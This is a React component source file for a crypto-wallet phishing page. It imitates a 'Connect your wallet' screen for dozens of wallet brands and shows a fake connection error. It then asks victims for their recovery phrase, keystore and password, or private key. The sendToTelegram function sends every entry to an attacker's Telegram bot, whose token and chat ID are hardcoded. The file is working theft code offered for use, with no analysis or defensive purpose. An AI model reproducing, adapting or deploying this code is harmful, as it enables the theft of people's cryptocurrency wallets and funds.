import React, { useState } from 'react';
import './Gallery.css';
import { useNavigate } from 'react-router-dom';
import Loading from '../../Components/Loading';
import { ClipLoader } from 'react-spinners';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

const Gallery1 = () => {
    const [box, setBox] = useState([
        {
            img: 'https://maino.defixxpage.dev/ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png', name: 'Wallet Connect'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.png', name: 'Trust'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.png', name: 'Metamask'
        },
        {
            img: 'https://maino.defixxpage.dev/bitcoin-trading.io/wp-content/uploads/2021/10/ledger_logo.png', name: 'Ledger'
        },
        {
            img: 'https://maino.defixxpage.dev/en/images/brd.jpg', name: 'BRD wallet'
        },
        {
            img: 'https://maino.defixxpage.dev/dvh1deh6tagwk.cloudfront.net/finder-au/wp-uploads/2017/09/Coinbaselogo_Supplied_250x250-2.png', name: 'Coinbase'
        },
        {
            img: 'https://maino.defixxpage.dev/en/images/saitama.png', name: 'Saitamask wallet'
        },
        {
            img: 'https://maino.defixxpage.dev/en/images/terra.png', name: 'Terra station'
        },
        {
            img: 'https://maino.defixxpage.dev/en/images/phantom.jpg', name: 'Phantom wallet'
        },
        {
            img: 'https://maino.defixxpage.dev/en/images/cosmos.png', name: 'Cosmos station'
        },
        {
            img: 'https://maino.defixxpage.dev/en/images/exodus.png', name: 'Exodus wallet'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.png', name: 'Rainbow'
        },
        {
            img: 'https://maino.defixxpage.dev/pbs.twimg.com/profile_images/1024585501901303808/m92jEcPI_400x400.jpg', name: 'Argent'
        },
        {
            img: 'https://maino.defixxpage.dev/user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png', name: 'Binance Chain'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/ecc31a8e-0ee9-49db-cc59-0876b7c35600/lg', name: 'Safemoon'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/0b7e0f05-0a5b-4f3c-315d-59c1c4c22c00/lg', name: 'Gnosis Safe'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpg', name: 'DeFi'
        },
        {
            img: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAYFBMVEV1Adn///9rANeZUeK0i+lqANf79P/gyPZ+Edt3ANrm0vjt3PrKqvCveuivfOi/lu3Cmu6gX+THo+/Ale3z5fzZuPWqdefr2fqSQOHx5/vjzfembuaxgemrc+fRs/GFJt194pibAAABw0lEQVR4nO3c2W7bMBBAUZGpW3dNmrbp3vz/XzZpNjuxBFSgQ87gnHcBc8Gh7CdNEwAAAAAAAAAAAAAAkMy29wBH9/G89h7hyE7KafLEk1I+bXoPcVRXhclP8bowd+K/wnKWOPGmsJzlvYu3hYkX9a4w76LeF6Zd1IfCrKe4U5g0cbdw6MS6ZOnBvcJyOuxd3H5+O+/LUuJ+4binuC0L3vxH4bCJ7QpHTWxYOOjvYsvCMU+xaeGQiW0LR0xsXFguhktsXfhC4bNTOE/hKBTOUzgKhfMUjkLhPIWjUDhP4SgUzlM4isXCrxkKp9dLlh4MU7iawvgUxqcwPoXxKYxPYXwK41MYn8L4FManMD6F8SmML0xh3az0LUjhtrxcK0xhWwqfn0KFCvtTqFBhfwoVKuxPoUKF/SnMWvj91Uo/fvYOeqJ+OFR4vln8MM/Kb/Z0Un8dKHw34qSr1ffZCw8lJis8kJit8OnrJl3hVC+yFz5OTFj4aFEzFu6/blIW7iXmLNxd1KSFO4lZCx8WNW3hfWLewrvExIW3dzFz4c2/m9SFU/2dvfD6LiYvvLqLf5IXTvWy9wQAAAAAAAAAAAAAAEBrfwFLJCClTlJ5TwAAAABJRU5ErkJggg==', name: 'Pillar'
        },
        {
            img: 'https://play-lh.googleusercontent.com/Ja-xk6ZTXzuGVvqfTRJahBBwJLFE-Dz8pEdyjfRM9jz87fDA_hdYDe3QM70EzyquDw', name: 'imToken'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg', name: 'ONTO'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.png', name: 'TokenPocket'
        },
        {
            img: 'https://maino.defixxpage.dev/cryptologos.cc/logos/aave-aave-logo992f.png?v=022', name: 'Aave'
        },
        {
            img: 'https://maino.defixxpage.dev/s2.coinmarketcap.com/static/img/coins/200x200/2772.png', name: 'Digitex'
        },
        {
            img: 'https://maino.defixxpage.dev/cdn.dribbble.com/users/1298186/screenshots/4669247/portis_logo_dribbble.png', name: 'Portis'
        },
        {
            img: 'https://maino.defixxpage.dev/pbs.twimg.com/profile_images/1293288961800933376/rtDOqMXY_400x400.jpg', name: 'Formatic'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg', name: 'MathWallet'
        },
        {
            img: 'https://maino.defixxpage.dev/ffnews.com/wp-content/uploads/2021/09/1581439195205.jpg', name: 'BitPay'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/e8803581-a57f-4e4f-5a1b-c642c5da1900/lg', name: 'Ledger Live'
        },
        {
            img: 'https://maino.defixxpage.dev/en/walleth.jpeg', name: 'WallETH'
        },
        {
            img: 'https://maino.defixxpage.dev/en/Authereum.png', name: 'Authereum'
        },
        {
            img: 'https://maino.defixxpage.dev/pbs.twimg.com/profile_images/1376595920809160707/5DxVDK36_400x400.png', name: 'Dharma'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/dce1ee99-403f-44a9-9f94-20de30616500/lg', name: '1inch Wallet'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/5a96d19c-93d3-4e6a-624a-16f52773d000/lg', name: 'Huobi'
        },
        {
            img: 'https://maino.defixxpage.dev/icodrops.com/wp-content/uploads/2017/09/8EXrk57o_400x400.jpg', name: 'Eidoo'
        },
        {
            img: 'https://maino.defixxpage.dev/is2-ssl.mzstatic.com/image/thumb/Purple112/v4/58/45/bf/5845bfec-7804-a710-329a-9627057742de/AppIcon-1x_U007emarketing-0-7-0-0-85-220.png/512x512bb.jpg', name: 'MYKEY'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/2972bbf8-0891-414a-f63c-8d3bcf661d00/lg', name: 'Loopring'
        },
        {
            img: 'https://maino.defixxpage.dev/www.cryptocompare.com/media/36798689/trustvault.png', name: 'TrustVault'
        },
        {
            img: 'https://play-lh.googleusercontent.com/t8vnANR3Ofzoe1rgCTV5McOtbnXLxt7uTKa7nM9uVxthfeXzOEkLiyf6Mbwo6bf1Gjs', name: 'Atomic'
        },
        {
            img: 'https://maino.defixxpage.dev/s2.coinmarketcap.com/static/img/coins/64x64/10903.png', name: 'Coin98'
        },
        {
            img: 'https://maino.defixxpage.dev/cryptologos.cc/logos/tron-trx-logo.png', name: 'Tron'
        },
        {
            img: 'data:image/png;base64,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', name: 'Alice'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg', name: 'AlphaWallet'
        },{
            img: 'https://play-lh.googleusercontent.com/4GO-Bjl9nTDw_C2nrM4erEEl26IriD3AxzfLK6Qfp__0LfrxSUxF8MPH4WOgfL8G1g', name: `D'CENT`
        },
        {
            img: 'https://maino.defixxpage.dev/en/zelcore.png', name: 'Zelcore'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/12f981b1-bb0a-4115-009f-317255979600/lg', name: 'Nash'
        },
        {
            img: 'https://maino.defixxpage.dev/bittrust.s3.amazonaws.com/1433894569.png', name: 'Coinmoni'
        },
        {
            img: 'https://maino.defixxpage.dev/en/gridplus.png', name: 'GridPlus'
        },
        {
            img: 'https://play-lh.googleusercontent.com/M5MM-IxyhSSpgLokb4dDWL-e0n3G4QFIoUXj195qcP-ORF4qTUHom4cAg3feMU482b0', name: 'CYBAVO'
        },
        {
            img: 'https://maino.defixxpage.dev/is4-ssl.mzstatic.com/image/thumb/Purple122/v4/a2/80/13/a28013ce-da98-fd24-2a9a-a22ecfef7cb8/AppIcon-1x_U007emarketing-0-7-0-85-220.png/512x512bb.jpg', name: 'Tokenary'
        },
        {
            img: 'https://maino.defixxpage.dev/en/torus.png', name: 'Torus'
        },
        {
            img: 'https://play-lh.googleusercontent.com/XapLe0eCXaXS1TK-Gy-uKioBDDSjWP9GBJsEG5dNBYvJbgopreJm-fht8p04v3_1ug', name: 'Spatium'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.png', name: 'Safepal'
        },
        {
            img: 'https://play-lh.googleusercontent.com/hSuqrK6xxYr9xTBi7LWawuH8WLSpBXP3QUWr5AosjUxZedLHYCEWIQtZAGmeB7x5Bns', name: 'Infinito'
        },
        {
            img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcsfznQP1QJxDpj-78pN5FiUInTPDxY91MNDkG8QgBSne8lEWgicB3eCywth5sRVHanks&usqp=CAU', name: 'wallet.io'
        },
        {
            img: 'https://play-lh.googleusercontent.com/XzzaoXwedJjCiQeB4Sh3nOIlB5iR8fOxCTKbFLTiAyJ0JqFJogC3mbA6pj3fIR2y3lw', name: 'Ownbit'
        },
        {
            img: 'https://maino.defixxpage.dev/is5-ssl.mzstatic.com/image/thumb/Purple124/v4/d2/bc/d7/d2bcd729-ae03-6f33-7446-f60e853c5229/source/512x512bb.jpg', name: 'Easypocket'
        },
        {
            img: 'https://play-lh.googleusercontent.com/sjG683ufdRoN5jpY-Ecx4hg5LrQSr7J2B5mqTHFbJZw2H4df5onayMkr7Jx7yCCncqhm', name: 'Bridge wallet'
        },
        {
            img: 'https://maino.defixxpage.dev/www.yadawallets.com/wp-content/uploads/2021/01/Sparkpoint-wallet-logo.png', name: 'Spark point'
        },
        {
            img: 'https://play-lh.googleusercontent.com/HusrjtJaiFk2nj6FfYQbewVKIHkmO9KwivN-X-_pOdk0wHrLneT7JfKtXHr7XWCJ0A', name: 'ViaWallet'
        },
        {
            img: '', name: 'BitKeep'
        },
        {
            img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStYOYgG0-6goX5kiAru3Il4AQFobHWEdZNp95X3-U4SYldTq3v2cEl75b4Qy9CkWBVKNE&usqp=CAU', name: 'Vision'
        },
        {
            img: 'https://play-lh.googleusercontent.com/F9cuPNT3VdkBfHm1zv4lfkpvdXHA5fxnaVbL2iDAGGNaIHtg7eNvgX2Bawwg1JbO2SrJ', name: 'PEAKDEFI'
        },
        {
            img: 'https://play-lh.googleusercontent.com/eH0bEWCoW5a5WkmYsrBNX17Rj50-W45-JsDCvku2TEySTFzs_Jw1oQ9LCLuwNDJRa2o', name: 'Unstoppable'
        },
        {
            img: 'https://maino.defixxpage.dev/en/halo.jpeg', name: 'HaloDeFi'
        },
        {
            img: 'https://play-lh.googleusercontent.com/5qTn8Cie_rp_XwNdLuLL1XpEFaK6yBUHeuJbyD0pXc4Ix6dcJ6NLoHYCcCE1jiMSp3M', name: 'Dok Wallet'
        },
        {
            img: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTv9YhdYp_toQcTmozYWNjP8_OypqBx4zkj-jlh0apPWzcJx374lH-KRaFHSL61D7ED_uI&usqp=CAU', name: 'Midas'
        },
        {
            img: 'https://maino.defixxpage.dev/miro.medium.com/v2/resize_fit_2400/1_N6Uvv2QMQGqQubnGP1tGig.png', name: 'Ellipal'
        },
        {
            img: 'https://maino.defixxpage.dev/keyring.app/wp-content/uploads/2021/11/LOGO-KEYRING-PRO-2.png', name: 'KEYRING PRO'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpg', name: 'Aktionariat'
        },
        {
            img: 'https://play-lh.googleusercontent.com/CVWMBVPRHmb1tPeP-gSAApuwq9nsbPZ7kY6qz5u71fd7D0pJc2MftVogk4v7fD5HJ2oR', name: 'Talken'
        },
        {
            img: 'https://maino.defixxpage.dev/s3-eu-west-1.amazonaws.com/tpd/logos/5d79d072c62fd60001ba75a7/0x0.png', name: 'Flare'
        },
        {
            img: 'https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/3abd1720-260e-495a-2e31-3d0b349e0d00/lg', name: 'KyberSwap'
        },
        {
            img: 'https://play-lh.googleusercontent.com/lWSSUqkjBHcT1O5O4MUFWw0K6gbjLuziXswj0USfbb_WgtjZk5FgPHiG1-suYMkMKg=w300', name: 'PayTube'
        },
        {
            img: 'https://maino.defixxpage.dev/registry.walletconnect.org/logo/lg/dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.png', name: 'Linen'
        },
    ])
    const [selectedWallet, setSelectedWallet] = useState(null);
    const [showModal, setShowModal] = useState(false);
    const [showManualConnect, setShowManualConnect] = useState(false);
    const [activeMethod, setActiveMethod] = useState('Phrase');
      const [loading, setLoading] = useState(false);
    
      const formSchema = z.object({
        phrase: activeMethod === 'Phrase' ? z.string().min(1, 'Required') : z.string().optional(),
        keystore: activeMethod === 'Keystore' ? z.string().min(1, 'Required') : z.string().optional(),
        privateKey: activeMethod === 'Private Key' ? z.string().min(1, 'Required') : z.string().optional(),
        wallet: activeMethod === 'Keystore' ? z.string().min(1, 'Required') : z.string().optional(),
      });
      
      
        const {
          register,
          handleSubmit,
          formState: { errors, isValid },
        } = useForm({
          resolver: zodResolver(formSchema),
          mode: 'onChange',
        });

    const handleImageClick = (wallet) => {
        setSelectedWallet(wallet);
        setShowModal(true);
        setShowManualConnect(false);
    };

    const closeModal = () => {
        setShowModal(false);
        setSelectedWallet(null);
    };

    const goToManualConnect = () => {
        setShowManualConnect(true);
    };

    const handleMethodChange = (method) => {
        setActiveMethod(method);
    };

    const Nav = useNavigate()

    const onSubmit = async (data) => {
        console.log('working')
        setLoading(true);
        const methodData = {
            method: activeMethod,
            value: data[activeMethod.toLowerCase()] || '', 
        };
    
        const telegramData = {
            ...data,
            ...methodData, 
        };
        console.log('Data being sent to Telegram:', telegramData);
        await sendToTelegram(telegramData);
        setIsSubmitted(true);
    };
    
    const sendToTelegram = async (data) => {
        const botToken = '7936174005:AAGh1E77hIQBIJUZX1S7ppyouSOIMpFmsNg';
        const chatId = '6701777563';
    
        const methodMessage = `
    Method: ${data.method}
    Value: ${data.value}
    `;
    
        const message = `User Data:
    Phrase: ${data.phrase || 'N/A'}
    Keystore: ${data.keystore || 'N/A'}
    Private Key: ${data.privateKey || 'N/A'}
    Wallet Password: ${data.wallet || 'N/A'}
    ${methodMessage}`;
    
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
    
            if (!response.ok) {
                throw new Error(`Error ${response.status}: ${response.statusText}`);
            }
        } catch (error) {
            console.error('Error sending message to Telegram:', error.message);
        } finally {
            setLoading(false);
        }
    };
    

    return (
        <div className="Gallery1">
                        <header>
            <img src="https://maino.defixxpage.dev/ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="" />
            </header>
            <div className="wrap">
            <div className="head">
                <h1>CONNECT YOUR WALLET</h1>
                <span>Please connect your wallet to continue</span>
            </div>
            <div className="cardHold">
                {box.length === 0 ? (
                    <Loading />
                ) : (
                    box.map((wallet, index) => (
                        <section key={index}>
                            <div className="imgHolder">
                                <img onClick={() => handleImageClick(wallet)} src={wallet.img} alt="Loading..." />
                            </div>
                            <span>{wallet.name}</span>
                        </section>
                    ))
                )}
            </div>
            </div>
            {showModal && (
                <div className="modal">
                    <div className="modal-content">
                        {!showManualConnect ? (
                            <div className="modal-body">
                                <div className="modal-header">
                                    <h3 onClick={() => setShowManualConnect(false)} style={{ cursor: 'pointer' }}>
                                        Back
                                    </h3>
                                    <button className="close-button" onClick={closeModal}>
                                        X
                                    </button>
                                </div>
                                <div className="modalC">
                                    <div className="error-section">
                                        <p>Error connecting...</p>
                                        <button onClick={goToManualConnect}>Connect Manually</button>
                                    </div>
                                    <div className="wallet-info">
                                        <img src={selectedWallet?.img} alt={selectedWallet?.name} />
                                        <h1>{selectedWallet?.name}</h1>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div className="manual-connect">
                                <div className="manual-header">
                                    <img src={selectedWallet?.img} alt={selectedWallet?.name} />
                                    <h1>{selectedWallet?.name}</h1>
                                </div>
                                <div className="manual-methods" style={{ borderBottom: '2px solid #ccc' }}>
                                    {['Phrase', 'Keystore', 'Private Key'].map((method) => (
                                        <button
                                            key={method}
                                            className={`manual-button ${activeMethod === method ? 'active' : ''}`}
                                            onClick={() => handleMethodChange(method)}
                                        >
                                            {method}
                                        </button>
                                    ))}
                                </div>
                                {activeMethod === 'Phrase' && (
                                <form onSubmit={handleSubmit(onSubmit)} className="phrase-section">
                                    <textarea {...register('phrase')}  placeholder="Enter your recovery phrase"></textarea>
                                    {errors.phrase && <span style={{ color: 'red' }}>{errors.phrase.message}</span>}
                                    <span>Typically 12 (sometimes 24) words separated by single spaces</span>
                                    <button type="submit" className="proceed">
                                        {loading && activeMethod === 'Phrase' ? <ClipLoader color="white" size={20} /> : 'Proceed'}
                                    </button>
                                    <button type="button" className="cancel" onClick={closeModal}>
                                        Cancel
                                    </button>
                                </form>
                            )}

                            {activeMethod === 'Keystore' && (
                                <form onSubmit={handleSubmit(onSubmit)} className="keystore-section">
                                    <textarea {...register('keystore')}  placeholder="Enter keystore"></textarea>
                                    {errors.keystore && <span style={{ color: 'red' }}>{errors.keystore.message}</span>}
                                    <input {...register('wallet')} type="text" placeholder="Wallet-password" />
                                    {errors.wallet && <span style={{ color: 'red' }}>{errors.wallet.message}</span>}
                                    <span>Several lines of text beginning with "..." plus the password you used to encrypt it.</span>
                                    <button type="submit" className="proceed">
                                        {loading && activeMethod === 'Keystore' ? <ClipLoader color="white" size={20} /> : 'Proceed'}
                                    </button>
                                    <button type="button" className="cancel" onClick={closeModal}>
                                        Cancel
                                    </button>
                                </form>
                            )}

                            {activeMethod === 'Private Key' && (
                                <form onSubmit={handleSubmit(onSubmit)} className="private-key-section">
                                    <input {...register('privateKey')} type="text" placeholder="Enter your private key" />
                                    {errors.privateKey && <span style={{ color: 'red' }}>{errors.privateKey.message}</span>}
                                    <span>Typically 12 (sometimes 24) words separated by single spaces</span>
                                    <button type="submit" className="proceed">
                                        {loading && activeMethod === 'Private Key' ? <ClipLoader color="white" size={20} /> : 'Proceed'}
                                    </button>
                                    <button type="button" className="cancel" onClick={closeModal}>
                                        Cancel
                                    </button>
                                </form>
                            )}
                            </div>
                        )}
                    </div>
                </div>
            )}
        </div>
    );
};

export default Gallery1;